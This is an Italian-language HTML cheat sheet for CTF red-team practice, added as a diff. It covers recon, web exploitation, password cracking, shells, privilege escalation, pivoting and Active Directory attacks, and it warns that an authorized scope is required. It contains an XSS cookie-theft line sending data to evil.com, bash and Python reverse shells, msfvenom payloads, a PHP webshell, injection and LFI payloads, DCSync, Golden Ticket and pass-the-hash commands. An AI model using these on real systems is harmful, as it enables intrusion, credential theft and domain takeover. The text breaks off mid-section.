@@ -1,0 +1,1358 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CTF Red Team - Guida Rapida</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --card: #161b22;
+    --border: #30363d;
+    --text: #c9d1d9;
+    --accent: #ff7b72;
+    --accent2: #79c0ff;
+    --green: #7ee787;
+    --yellow: #f2cc60;
+    --code-bg: #1f242c;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    line-height: 1.6;
+    padding: 10px;
+    font-size: 15px;
+  }
+  h1 {
+    color: var(--accent);
+    font-size: 1.4em;
+    margin-bottom: 6px;
+    text-align: center;
+  }
+  .subtitle {
+    text-align: center;
+    color: #8b949e;
+    font-size: 0.85em;
+    margin-bottom: 12px;
+  }
+
+  /* NAVBAR ORIZZONTALE */
+  nav {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 6px;
+    margin-bottom: 12px;
+    display: flex;
+    flex-wrap: nowrap;
+    overflow-x: auto;
+    gap: 4px;
+    -webkit-overflow-scrolling: touch;
+    scrollbar-width: none;
+  }
+  nav::-webkit-scrollbar { display: none; }
+  nav a {
+    color: var(--text);
+    text-decoration: none;
+    padding: 6px 10px;
+    border-radius: 4px;
+    font-size: 0.8em;
+    white-space: nowrap;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    flex-shrink: 0;
+  }
+  nav a:active, nav a:hover {
+    background: var(--accent);
+    color: #000;
+    border-color: var(--accent);
+  }
+
+  section {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px;
+    margin-bottom: 12px;
+  }
+  section h2 {
+    color: var(--accent);
+    font-size: 1.1em;
+    margin-bottom: 10px;
+    padding-bottom: 6px;
+    border-bottom: 1px solid var(--border);
+  }
+  section h3 {
+    color: var(--accent2);
+    font-size: 0.95em;
+    margin: 12px 0 6px;
+  }
+  section h4 {
+    color: var(--yellow);
+    font-size: 0.9em;
+    margin: 8px 0 4px;
+  }
+  p { margin-bottom: 8px; }
+  ul, ol { margin-left: 18px; margin-bottom: 8px; }
+  li { margin-bottom: 4px; }
+  code {
+    background: var(--code-bg);
+    color: var(--green);
+    padding: 2px 5px;
+    border-radius: 3px;
+    font-family: 'Courier New', monospace;
+    font-size: 0.85em;
+    word-break: break-all;
+  }
+  pre {
+    background: var(--code-bg);
+    color: var(--green);
+    padding: 10px;
+    border-radius: 6px;
+    overflow-x: auto;
+    font-family: 'Courier New', monospace;
+    font-size: 0.8em;
+    line-height: 1.4;
+    margin: 8px 0;
+    border: 1px solid var(--border);
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+  .box {
+    background: #1c2128;
+    border-left: 3px solid var(--yellow);
+    padding: 8px 10px;
+    border-radius: 4px;
+    margin: 8px 0;
+    font-size: 0.9em;
+  }
+  .box-warn { border-left-color: var(--accent); }
+  .box-info { border-left-color: var(--accent2); }
+  .box-ok { border-left-color: var(--green); }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 8px 0;
+    font-size: 0.85em;
+  }
+  th, td {
+    border: 1px solid var(--border);
+    padding: 6px;
+    text-align: left;
+  }
+  th {
+    background: var(--code-bg);
+    color: var(--accent2);
+  }
+  .back-top {
+    display: block;
+    text-align: center;
+    color: var(--accent2);
+    text-decoration: none;
+    font-size: 0.85em;
+    margin-top: 10px;
+    padding: 6px;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+  }
+  .back-top:active { background: var(--code-bg); }
+</style>
+</head>
+<body>
+
+<h1>CTF Red Team - Guida Rapida</h1>
+<p class="subtitle">Tutti gli argomenti del manuale</p>
+
+<nav>
+  <a href="#warmup">Warm-up</a>
+  <a href="#r1">R1 Recon</a>
+  <a href="#r2">R2 Web</a>
+  <a href="#r3">R3 Password</a>
+  <a href="#r4">R4 Shell</a>
+  <a href="#r5">R5 PrivEsc</a>
+  <a href="#r6">R6 Pivoting</a>
+  <a href="#r7">R7 AD</a>
+  <a href="#workflow">Workflow</a>
+  <a href="#comandi">Comandi</a>
+</nav>
+
+<!-- WARM-UP -->
+<section id="warmup">
+  <h2>Warm-up (Crypto, OSINT, Stego)</h2>
+
+  <h3>Crittografia & Encoding</h3>
+  <div class="box box-info">Encoding non è crittografia. Base64/Hex/URL non proteggono nulla.</div>
+  <h4>Riconoscimento al volo</h4>
+  <ul>
+    <li><b>Base64</b>: alfanumerico + <code>+</code> <code>/</code> <code>=</code>, lunghezza multipla di 4</li>
+    <li><b>Hex</b>: solo <code>0-9a-f</code>, lunghezza pari</li>
+    <li><b>URL encoding</b>: sequenze <code>%XX</code></li>
+    <li><b>Unicode escape</b>: <code>\uXXXX</code></li>
+  </ul>
+  <h4>Comandi</h4>
+  <pre>echo -n "testo" | base64
+echo "dGVzdG8=" | base64 -d
+echo -n "testo" | xxd -p
+echo "746573746f" | xxd -r -p</pre>
+  <h4>CyberChef</h4>
+  <ul>
+    <li>Usa <b>Magic</b> per decodifiche automatiche</li>
+    <li>Ricette multi-step: Base64 -> Hex -> Gunzip</li>
+    <li>URL: gchq.github.io/CyberChef</li>
+  </ul>
+  <h4>Cifrari classici</h4>
+  <ul>
+    <li><b>Cesare</b>: 25 chiavi, brute force</li>
+    <li><b>Vigenere</b>: analisi frequenze</li>
+    <li><b>XOR</b>: chiave breve, brute force</li>
+  </ul>
+  <h4>Hash</h4>
+  <ul>
+    <li>MD5/SHA1 rotti, SHA256 standard</li>
+    <li>Password: bcrypt, Argon2id</li>
+  </ul>
+
+  <h3>OSINT</h3>
+  <h4>Google Dorking</h4>
+  <pre>site:target.com filetype:pdf
+inurl:admin
+intitle:"index of"</pre>
+  <h4>Subdomain enumeration</h4>
+  <pre>subfinder -d target.com -silent -o subs.txt
+amass enum -passive -d target.com -o amass.txt
+curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[].name_value' | sort -u</pre>
+  <h4>Shodan/Censys</h4>
+  <pre>port:22 country:IT
+org:"Acme Corp"
+ssl:"target.com"</pre>
+  <h4>Metadata</h4>
+  <pre>exiftool foto.jpg
+exiftool documento.pdf</pre>
+
+  <h3>Steganografia</h3>
+  <h4>Workflow</h4>
+  <pre>file immagine.png
+exiftool immagine.png
+binwalk immagine.png
+strings immagine.png | less
+zsteg -a immagine.png
+steghide info immagine.jpg
+stegseek immagine.jpg rockyou.txt</pre>
+  <h4>Audio</h4>
+  <ul>
+    <li>Spettrogramma con Audacity</li>
+    <li>DTMF, Morse, SSTV</li>
+  </ul>
+  <h4>Testo</h4>
+  <ul>
+    <li>Zero-width characters</li>
+    <li>Whitespace coding</li>
+    <li>Omoglifi</li>
+  </ul>
+  <a class="back-top" href="#">Torna all'indice</a>
+</section>
+
+<!-- R1 -->
+<section id="r1">
+  <h2>1. Recon & Enumeration (R1)</h2>
+  <div class="box box-warn">Passiva prima, attiva dopo. Sempre su scope autorizzato.</div>
+
+  <h3>Subdomain enumeration</h3>
+  <pre>subfinder -d target.com -all -silent -o subs.txt
+amass enum -passive -d target.com -o amass.txt
+assetfinder --subs-only target.com > asset.txt
+cat subs.txt amass.txt asset.txt | sort -u > all_subs.txt</pre>
+
+  <h3>Nmap</h3>
+  <pre># Scan base
+nmap -sV -sC target
+
+# Tutte le porte
+nmap -p- --min-rate 5000 -T4 target
+
+# Aggressivo
+sudo nmap -sS -sV -sC -O -T4 target -oA scan
+
+# Script specifici
+nmap --script vuln target
+nmap --script smb-enum-shares -p 139,445 target</pre>
+
+  <h3>Scanner veloci</h3>
+  <pre># Masscan (sempre --rate!)
+sudo masscan -p1-65535 203.0.113.0/24 --rate 5000 -oG masscan.gnmap
+
+# RustScan
+rustscan -a target -- -sV -sC
+
+# Naabu
+naabu -host targets.txt -p - -rate 500 -o naabu.txt</pre>
+
+  <h3>Fingerprinting</h3>
+  <pre>httpx -l subs.txt -status-code -title -tech-detect -o http.txt
+whatweb https://target.com</pre>
+
+  <h3>Content discovery</h3>
+  <pre>ffuf -u https://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,403
+feroxbuster -u https://target -w wordlist.txt -d 3 -t 50
+gobuster dir -u https://target -w wordlist.txt -x php,txt,bak</pre>
+
+  <h3>Nuclei</h3>
+  <pre>nuclei -l http.txt -severity medium,high,critical -rate-limit 30 -o findings.txt
+nuclei -update-templates</pre>
+
+  <h3>Pipeline completa</h3>
+  <pre>subfinder -d target.com -silent | dnsx -silent | naabu -silent -p 80,443,8080,8443 | httpx -silent | nuclei -silent -severity medium,high,critical</pre>
+
+  <h3>Cosa cercare</h3>
+  <ul>
+    <li>Software vecchio: Apache 2.2, PHP 5, WordPress 4.x</li>
+    <li>File esposti: <code>.env</code>, <code>.git/</code>, backup, log</li>
+    <li>Admin panel: <code>/admin/</code>, <code>/wp-admin/</code>, <code>/phpmyadmin/</code></li>
+    <li>API docs: <code>/swagger-ui/</code>, <code>/api-docs</code></li>
+    <li>Subdomain takeover (CNAME orfani)</li>
+  </ul>
+  <a class="back-top" href="#">Torna all'indice</a>
+</section>
+
+<!-- R2 -->
+<section id="r2">
+  <h2>2. Web Exploitation (R2)</h2>
+  <div class="box box-warn">Scope scritto obbligatorio. Exploitation senza autorizzazione è reato.</div>
+
+  <h3>SQL Injection</h3>
+  <pre># Test manuale
+' OR 1=1--
+' UNION SELECT null,null--
+' AND SLEEP(5)--
+
+# Sqlmap
+sqlmap -u "https://target/product?id=1" --batch
+sqlmap -r request.txt --batch --dbs
+sqlmap -r request.txt --batch -D db -T users --dump
+sqlmap -r request.txt --batch --os-shell</pre>
+
+  <h3>XSS</h3>
+  <pre>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;</pre>
+  <ul>
+    <li>Rubare cookie: <code>fetch('https://evil.com/c?c='+document.cookie)</code></li>
+    <li>Se HttpOnly, no cookie. Usa per CSRF o phishing on-domain</li>
+  </ul>
+
+  <h3>LFI / Path Traversal</h3>
+  <pre>?file=../../../../etc/passwd
+?file=....//....//etc/passwd
+?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd</pre>
+  <div class="box box-info">Log poisoning: inietta PHP in User-Agent, poi includi il log.</div>
+
+  <h3>Command Injection</h3>
+  <pre>; cat /etc/passwd
+| whoami
+&& id
+$(cat /etc/passwd)
+`id`</pre>
+  <ul>
+    <li>Blind: time-based (<code>sleep 5</code>), out-of-band (<code>curl interact.sh</code>)</li>
+  </ul>
+
+  <h3>File Upload</h3>
+  <pre>&lt;?php system($_GET['cmd']); ?&gt;</pre>
+  <ul>
+    <li>Bypass: doppia estensione (<code>shell.php.jpg</code>), null byte (<code>shell.php%00.jpg</code>), Content-Type, magic bytes</li>
+    <li><b>Non usare webshell scaricate da internet</b> (backdoor)</li>
+  </ul>
+
+  <h3>SSRF</h3>
+  <pre>http://169.254.169.254/latest/meta-data/  # AWS
+http://metadata.google.internal/          # GCP
+http://127.0.0.1/admin/
+http://localhost:8080/</pre>
+
+  <h3>IDOR / Broken Access Control</h3>
+  <ul>
+    <li>Cambia <code>id=42</code> in <code>id=43</code></li>
+    <li>Usa due account: uno per generare richieste, l'altro per testare</li>
+    <li>Autorize (Burp) automatizza</li>
+  </ul>
+
+  <h3>Burp Suite</h3>
+  <ul>
+    <li><b>Proxy</b>: intercetta traffico</li>
+    <li><b>Repeater</b>: modifica e rilancia richieste</li>
+    <li><b>Intruder</b>: fuzzing parametri</li>
+    <li><b>Decoder</b>: base64, URL, hex</li>
+    <li>Estensioni: Logger++, Autorize, Turbo Intruder, Param Miner</li>
+  </ul>
+
+  <h3>PortSwigger Web Security Academy</h3>
+  <div class="box box-ok">La risorsa numero 1 per pratica web. 250+ lab gratuiti. Usa Burp Community.</div>
+  <a class="back-top" href="#">Torna all'indice</a>
+</section>
+
+<!-- R3 -->
+<section id="r3">
+  <h2>3. Password Attacks (R3)</h2>
+
+  <h3>Hashcat</h3>
+  <pre># MD5
+hashcat -m 0 hash.txt rockyou.txt
+
+# NTLM
+hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r rules/best64.rule
+
+# bcrypt
+hashcat -m 3200 hash.txt rockyou.txt
+
+# JWT HS256
+hashcat -m 16500 jwt.txt rockyou.txt
+
+# Kerberos AS-REP
+hashcat -m 18200 asrep.hash rockyou.txt
+
+# Kerberos TGS (Kerberoasting)
+hashcat -m 13100 tgs.hash rockyou.txt
+
+# Mask attack
+hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?l?d?d?d?d
+
+# Mostra risultati
+hashcat -m &lt;mode&gt; hash.txt --show</pre>
+
+  <h3>John the Ripper</h3>
+  <pre>john --wordlist=rockyou.txt hash.txt
+john --format=bcrypt --wordlist=rockyou.txt hash.txt
+john --show hash.txt
+
+# Conversion scripts
+zip2john file.zip &gt; hash
+ssh2john key &gt; hash
+keepass2john vault.kdbx &gt; hash</pre>
+
+  <h3>Wordlist</h3>
+  <ul>
+    <li><code>rockyou.txt</code> (Kali: <code>/usr/share/wordlists/rockyou.txt.gz</code>)</li>
+    <li>SecLists: github.com/danielmiessler/SecLists</li>
+    <li>CeWL: genera wordlist da sito target</li>
+    <li>cupp: wordlist mirate a profilo</li>
+  </ul>
+
+  <h3>Online attacks</h3>
+  <pre># Hydra
+hydra -l user -P passwords.txt ssh://target
+hydra -L users.txt -p 'Primavera2026!' ssh://target -t 4 -W 10
+
+# NetExec password spraying
+nxc smb target.txt -u users.txt -p 'Primavera2026!' --continue-on-success
+
+# Kerbrute
+kerbrute passwordspray -d dominio.corp users.txt 'Primavera2026!'</pre>
+
+  <h3>Kerberos roasting</h3>
+  <pre># AS-REP roasting
+GetNPUsers.py dominio.corp/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hash
+
+# Kerberoasting
+GetUserSPNs.py dominio.corp/user:pass -request -outputfile tgs.hash</pre>
+
+  <h3>Pattern umani</h3>
+  <ul>
+    <li>Parola + anno, parola + simbolo, leet, nome+cognome</li>
+    <li>Tastiera walk, stagioni, citta, squadre</li>
+  </ul>
+  <a class="back-top" href="#">Torna all'indice</a>
+</section>
+
+<!-- R4 -->
+<section id="r4">
+  <h2>4. Shells & Payloads (R4)</h2>
+
+  <h3>Listener</h3>
+  <pre>nc -lvnp 4444
+rlwrap nc -lvnp 4444
+ncat --ssl -lvnp 4444
+pwncat-cs -lp 4444  # auto-stabilize + post-ex</pre>
+
+  <h3>Reverse shell bash</h3>
+  <pre>bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</pre>
+
+  <h3>Reverse shell Python</h3>
+  <pre>python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("&lt;IP&gt;",&lt;PORT&gt;));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'</pre>
+
+  <h3>Stabilization (magic dance)</h3>
+  <pre># Dentro la raw shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Ctrl+Z per backgroundare
+# Sull'attaccante
+stty raw -echo; fg
+# (Enter Enter)
+
+# Sulla shell remota
+export TERM=xterm
+stty rows &lt;N&gt; columns &lt;M&gt;</pre>
+
+  <h3>msfvenom</h3>
+  <pre># EXE Windows x64 Meterpreter
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe -o payload.exe
+
+# ELF Linux shell reverse
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf -o shell.elf
+
+# JSP webshell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw -o shell.jsp</pre>
+
+  <h3>Metasploit</h3>
+  <pre>msfconsole
+msf6 &gt; use exploit/multi/handler
+msf6 &gt; set payload windows/x64/meterpreter/reverse_tcp
+msf6 &gt; set LHOST &lt;IP&gt;
+msf6 &gt; set LPORT &lt;PORT&gt;
+msf6 &gt; run</pre>
+
+  <h3>revshells.com</h3>
+  <div class="box box-ok">Genera payload per ogni linguaggio/contesto. Inserisci IP e porta, copia.</div>
+  <a class="back-top" href="#">Torna all'indice</a>
+</section>
+
+<!-- R5 -->
+<section id="r5">
+  <h2>5. Privilege Escalation (R5)</h2>
+
+  <h3>Linux enum</h3>
+  <pre>id; whoami; uname -a; cat /etc/os-release
+sudo -l
+find / -perm -u=s -type f 2&gt;/dev/null
+getcap -r / 2&gt;/dev/null
+cat /etc/crontab; ls -la /etc/cron.*
+find / -writable -type d 2&gt;/dev/null | grep -v proc
+ss -tlnp
+cat ~/.bash_history /root/.bash_history 2&gt;/dev/null</pre>
+
+  <h3>linPEAS</h3>
+  <pre>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</pre>
+
+  <h3>SUID exploit (GTFOBins)</h3>
+  <pre># find SUID
+find . -name x -exec /bin/sh -p \;
+
+# vim SUID
+vim -c ':!/bin/sh -p'
+
+# python SUID
+python -c 'import os; os.setuid(0); os.system("/bin/sh")'</pre>
+
+  <h3>Sudo misconfig</h3>
+  <pre># (root) NOPASSWD: /usr/bin/find
+sudo find /etc -exec /bin/sh \;
+
+# (root) NOPASSWD: /usr/bin/less
+sudo less /etc/profile
+# nel less: !sh
+
+# (root) NOPASSWD: /usr/bin/awk
+sudo awk 'BEGIN {system("/bin/sh")}'</pre>
+
+  <h3>Cron / PATH / Wildcard</h3>
+  <ul>
+    <li>Script cron scrivibile, modifica per shell root</li>
+    <li>PATH hijacking: fake <code>cat</code> in <code>$PATH</code></li>
+    <li>Wildcard injection: <code>tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh</code></li>
+  </ul>
+
+  <h3>Windows enum</h3>
+  <pre>whoami /priv /groups /all
+systeminfo
+sc query
+schtasks /query /fo LIST /v
+wmic qfe get HotFixID,InstalledOn
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</pre>
+
+  <h3>winPEAS</h3>
+  <pre>winpeasx64.exe
+winpeas.bat</pre>
+
+  <h3>PowerUp</h3>
+  <pre>Set-ExecutionPolicy Bypass -Scope Process
+. .\PowerUp.ps1
+Invoke-AllChecks</pre>
+
+  <h3>AlwaysInstallElevated</h3>
+  <pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f msi -o evil.msi
+# Su target
+msiexec /quiet /qn /i evil.msi</pre>
+
+  <h3>Token impersonation (SeImpersonate)</h3>
+  <ul>
+    <li><b>GodPotato</b>, <b>PrintSpoofer</b>, <b>RoguePotato</b>, <b>JuicyPotato</b></li>
+    <li>Output: shell SYSTEM</li>
+  </ul>
+
+  <h3>LOLBAS</h3>
+  <ul>
+    <li><code>mshta</code>, <code>rundll32</code>, <code>regsvr32</code>, <code>certutil</code>, <code>bitsadmin</code>, <code>MSBuild</code>, <code>InstallUtil</code></li>
+    <li>Bypass AppLocker/WDAC</li>
+  </ul>
+  <a class="back-top" href="#">Torna all'indice</a>
+</section>
+
+<!-- R6 -->
+<section id="r6">
+  <h2>6. Pivoting & Tunneling (R6)</h2>
+
+  <h3>SSH port forwarding</h3>
+  <pre># Local forward
+ssh -L 3306:192.168.50.10:3306 user@pivot
+
+# Dynamic SOCKS
+ssh -D 1080 user@pivot
+
+# Background + no shell + compressione
+ssh -f -N -D 1080 -C user@pivot</pre>
+
+  <h3>proxychains</h3>
+  <pre># /etc/proxychains4.conf -> socks5 127.0.0.1 1080
+proxychains nmap -Pn -sT -n 192.168.50.0/24 -p 22,80,443,445
+proxychains curl http://internal/</pre>
+
+  <h3>Chisel</h3>
+  <pre># Attaccante
+./chisel server --reverse --port 8080 --auth user:pass
+
+# Pivot
+./chisel client --auth user:pass http://&lt;ATTACKER&gt;:8080 R:1080:socks</pre>
+
+  <h3>Ligolo-ng</h3>
+  <pre># Attaccante (root)
+sudo ./ligolo-proxy -selfcert
+&gt; session
+&gt; start --tun ligolo
+sudo ip route add 192.168.50.0/24 dev ligolo
+
+# Pivot
+./ligolo-agent -connect &lt;ATTACKER&gt;:11601 -ignore-cert</pre>
+
+  <h3>sshuttle</h3>
+  <pre>sshuttle -r user@pivot 192.168.50.0/24 10.0.100.0/24</pre>
+
+  <h3>NTLM relay</h3>
+  <pre># Responder in modalita analyze
+sudo responder -I eth0 -A
+
+# ntlmrelayx
+ntlmrelayx.py -tf targets.txt -smb2support -socks</pre>
+  <a class="back-top" href="#">Torna all'indice</a>
+</section>
+
+<!-- R7 -->
+<section id="r7">
+  <h2>7. Active Directory (R7)</h2>
+
+  <h3>BloodHound</h3>
+  <pre># Da Linux
+bloodhound-python -u user -p pass -d dominio.corp -ns &lt;DC_IP&gt; -c All
+
+# Da Windows
+.\SharpHound.exe -c All</pre>
+  <ul>
+    <li>Importa in BloodHound CE</li>
+    <li>Query: "Shortest path to Domain Admins", "Kerberoastable accounts", "AS-REP roastable"</li>
+  </ul>
+
+  <h3>NetExec</h3>
+  <pre># Password spraying
+nxc smb &lt;CIDR&gt; -u users.txt -p 'Password!' --continue-on-success
+
+# Dump SAM
+nxc smb &lt;TARGET&gt; -u admin -p pass --sam
+
+# Dump NTDS (DA)
+nxc smb &lt;DC&gt; -u domain_admin -p pass --ntds
+
+# LDAP enum
+nxc ldap &lt;DC&gt; -u user -p pass --users --groups --kerberoasting kerb.hash</pre>
+
+  <h3>Impacket</h3>
+  <pre># AS-REP roasting
+GetNPUsers.py dominio.corp/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hash
+
+# Kerberoasting
+GetUserSPNs.py dominio.corp/user:pass -request -outputfile tgs.hash
+
+# DCSync
+secretsdump.py dominio.corp/da_user:pass@&lt;DC&gt; -just-dc
+
+# Esecuzione remota
+wmiexec.py dominio.corp/user:pass@&lt;TARGET&gt;
+psexec.py dominio.corp/user:pass@&lt;TARGET&gt;
+smbexec.py dominio.corp/user:pass@&lt;TARGET&gt;
+
+# Golden Ticket
+ticketer.py -nthash &lt;krbtgt_hash&gt; -domain-sid &lt;SID&gt; -domain dominio.corp administrator
+
+# Add computer (per RBCD)
+addcomputer.py -computer-name 'pwn$' -computer-pass 'Pwn3d!' dominio.corp/user:pass</pre>
+
+  <h3>Pass-the-Hash</h3>
+  <pre># NetExec
+nxc smb &lt;TARGET&gt; -u admin -H &lt;NTLM_hash&gt;
+
+# Impacket
+psexec.py -hashes :&lt;NTLM_hash&gt; dominio.corp/admin@&lt;TARGET&gt;</pre>
+
+  <h3>Pass-the-Ticket</h3>
+  <pre>export KRB5CCNAME=ticket.ccache
+psexec.py -k -no-pass dominio.corp/user@&lt;TARGET&gt;</pre>
+
+  <h3>Certipy (ADCS)</h3>
+  <pre># Find vulnerable templates
+certipy find -u user@dominio.corp -p pass -dc-ip &lt;DC&gt; -vulnerable -enabled
+
+# ESC1 exploitation
+certipy req -u user@dominio.corp -p pass -ca 'CA-NAME' -template VulnTemplate -upn administrator@dominio.corp
+
+# Authentication with cert
+certipy auth -pfx administrator.pfx -dc-ip &lt;DC&gt;</pre>
+
+  <h3>Rubeus (Windows)</h3>
+  <pre>Rubeus.exe kerberoast /outfile:tgs.hash
+Rubeus.exe asreproast /outfile:asrep.hash
+Rubeus.exe ptt /ticket:&lt;base64_ticket&gt;</pre>
+  <a class="back-top" href="#">Torna all'indice</a>
+</section>
+
+<!-- WORKFLOW -->
+<section id="workflow">
+  <h2>Workflow CTF - cosa fare in ordine</h2>
+  <ol>
+    <li><b>Warm-up</b>: Crypto, OSINT, Stego. Punti facili.</li>
+    <li><b>Recon</b>: Nmap, subdomain, content discovery, Nuclei.</li>
+    <li><b>Web</b>: SQLi, XSS, LFI, Command Injection, File Upload, SSRF, IDOR.</li>
+    <li><b>Foothold</b>: reverse shell, stabilizza.</li>
+    <li><b>PrivEsc</b>: linPEAS/winPEAS, GTFOBins, LOLBAS.</li>
+    <li><b>Pivoting</b>: se rete interna, chisel/ligolo.</li>
+    <li><b>AD</b>: BloodHound, Kerberoasting, DCSync, Golden Ticket, ADCS.</li>
+    <li><b>Documenta</b>: flag, comandi, writeup.</li>
+  </ol>
+  <a class="back-top" href="#">Torna all'indice</a>
+</section>
+
+<!-- COMANDI -->
+<section id="comandi">
+  <h2>Comandi Utili Completi</h2>
+
+  <h3>Exiftool - Metadata</h3>
+  <pre># Leggere tutti i metadata
+exiftool foto.jpg
+
+# Rimuovere tutti i metadata
+exiftool -all= foto.jpg
+
+# Scrivere un campo
+exiftool -Author="Mario Rossi" documento.pdf
+
+# Estrarre solo GPS
+exiftool -gps:all foto.jpg
+
+# Estrarre solo autore
+exiftool -Author documento.pdf
+
+# Estrarre metadata da piu file
+exiftool *.jpg
+
+# Output in formato JSON
+exiftool -json foto.jpg
+
+# Cercare stringhe nei metadata
+exiftool -a -u -g1 foto.jpg
+
+# Rimuovere metadata da PDF
+exiftool -all= documento.pdf</pre>
+
+  <h3>Nmap - Tutto l'utile</h3>
+  <pre># Scan base TCP
+nmap target
+
+# Scan con service detection
+nmap -sV target
+
+# Scan con script default
+nmap -sC target
+
+# Scan completo
+nmap -sV -sC -O target
+
+# Tutte le porte TCP
+nmap -p- target
+
+# Tutte le porte veloce
+nmap -p- --min-rate 5000 -T4 target
+
+# SYN scan (richiede root)
+sudo nmap -sS target
+
+# UDP scan
+sudo nmap -sU --top-ports 100 target
+
+# Host discovery
+nmap -sn 192.168.1.0/24
+
+# Disabilita ping
+nmap -Pn target
+
+# Scan di una subnet
+nmap 192.168.1.0/24
+
+# Scan da file
+nmap -iL targets.txt
+
+# Output in tutti i formati
+nmap -oA scan target
+
+# Script specifici
+nmap --script vuln target
+nmap --script smb-enum-shares -p 139,445 target
+nmap --script smb-vuln-ms17-010 -p 445 target
+nmap --script http-enum -p 80,443 target
+nmap --script dns-brute target
+nmap --script ssh-brute -p 22 target
+
+# Timing
+nmap -T0 target  # Paranoid
+nmap -T1 target  # Sneaky
+nmap -T2 target  # Polite
+nmap -T3 target  # Normal
+nmap -T4 target  # Aggressive
+nmap -T5 target  # Insane
+
+# Evasione
+nmap -D RND:10 target  # Decoy
+nmap -f target         # Frammentazione
+nmap --randomize-hosts target
+
+# Script NSE per categoria
+nmap --script "default" target
+nmap --script "safe" target
+nmap --script "discovery" target
+nmap --script "vuln" target
+nmap --script "brute" target
+
+# Esempi combinati
+sudo nmap -sS -sV -sC -O -p- -T4 target -oA full_scan
+nmap -sV -sC -p 22,80,443,445,3306,3389,8080 target
+nmap --script "http-* and not brute" -p 80,443 target</pre>
+
+  <h3>Burp Suite - Uso</h3>
+  <pre># Setup
+1. Avvia Burp Community
+2. Proxy -> Options -> 127.0.0.1:8080
+3. Browser -> proxy 127.0.0.1:8080
+4. Installa certificato: http://burp -> cacert.der
+5. Importa in browser come CA fidata
+
+# Schede principali
+Proxy        - intercetta traffico
+HTTP history - log richieste
+Target       - site map
+Repeater     - modifica e rilancia
+Intruder     - fuzzing
+Decoder      - encoding/decoding
+Comparer     - diff risposte
+
+# Scorciatoie
+Ctrl+R  - invia a Repeater
+Ctrl+I  - invia a Intruder
+Ctrl+Shift+R - invia a Repeater (nuova tab)
+
+# Intruder payload types
+Sniper     - un payload per volta
+Battering ram - stesso payload ovunque
+Pitchfork  - payload paralleli
+Cluster bomb - tutte le combinazioni
+
+# Estensioni utili
+Logger++       - log avanzato
+Autorize       - test access control
+Turbo Intruder - race condition
+Param Miner    - scoperta parametri
+JS Miner       - estrazione endpoint/secret
+Hackvertor     - encoding catena</pre>
+
+  <h3>John the Ripper - Tutto</h3>
+  <pre># Dictionary attack
+john --wordlist=rockyou.txt hash.txt
+
+# Single mode (usa contesto)
+john --single hash.txt
+
+# Incremental (brute force)
+john --incremental hash.txt
+
+# Formato specifico
+john --format=bcrypt --wordlist=rockyou.txt hash.txt
+john --format=raw-md5 --wordlist=rockyou.txt hash.txt
+john --format=nt --wordlist=rockyou.txt hash.txt
+
+# Con regole
+john --wordlist=rockyou.txt --rules=Jumbo hash.txt
+
+# Mostra risultati
+john --show hash.txt
+
+# Lista formati supportati
+john --list=formats
+
+# Conversion scripts
+zip2john file.zip > hash
+rar2john file.rar > hash
+7z2john file.7z > hash
+pdf2john file.pdf > hash
+ssh2john key > hash
+keepass2john vault.kdbx > hash
+office2john file.docx > hash
+pem2john cert.pem > hash
+
+# Esempi
+zip2john secret.zip > zip.hash
+john --wordlist=rockyou.txt zip.hash
+
+ssh2john id_rsa > ssh.hash
+john --wordlist=rockyou.txt ssh.hash
+
+keepass2john database.kdbx > keepass.hash
+john --wordlist=rockyou.txt keepass.hash</pre>
+
+  <h3>Hashcat - Mode principali</h3>
+  <pre># -m modes
+0     MD5
+100   SHA1
+1400  SHA256
+1700  SHA512
+1000  NTLM
+1100  DCC
+3000  LM
+5500  NetNTLMv1
+5600  NetNTLMv2
+3200  bcrypt
+1800  sha512crypt ($6$)
+500   md5crypt ($1$)
+7400  sha256crypt ($5$)
+16500 JWT HS256
+18200 Kerberos AS-REP
+13100 Kerberos TGS
+22000 WPA-PBKDF2
+
+# Attacks
+-a 0  dictionary
+-a 1  combinator
+-a 3  mask
+-a 6  hybrid dict+mask
+-a 7  hybrid mask+dict
+
+# Mask charset
+?l  minuscole
+?u  maiuscole
+?d  digits
+?s  simboli
+?a  tutti
+
+# Esempi
